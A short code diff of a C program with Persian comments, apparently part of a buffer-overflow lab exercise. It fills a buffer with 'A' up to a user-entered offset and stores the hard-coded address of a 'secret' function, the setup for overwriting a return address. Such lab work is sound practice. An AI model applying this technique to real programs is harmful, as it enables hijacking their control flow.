@@ -3,9 +3,13 @@
 
 int main() {
     char buffer[100];
-    int offset = 18; // جایگاه برگشت در حافظه که پیدا کردی
+    printf("Enter the number of offset: \n");
+    int offset = 10; // جایگاه برگشت در حافظه که پیدا کردی
+    
+    scanf("%d", &offset);
     void (*secret_addr)() = (void(*)())0x401196;  // آدرس تابع secret
 
+	
     // پر کردن buffer با 'A'
     memset(buffer, 'A', offset);
 
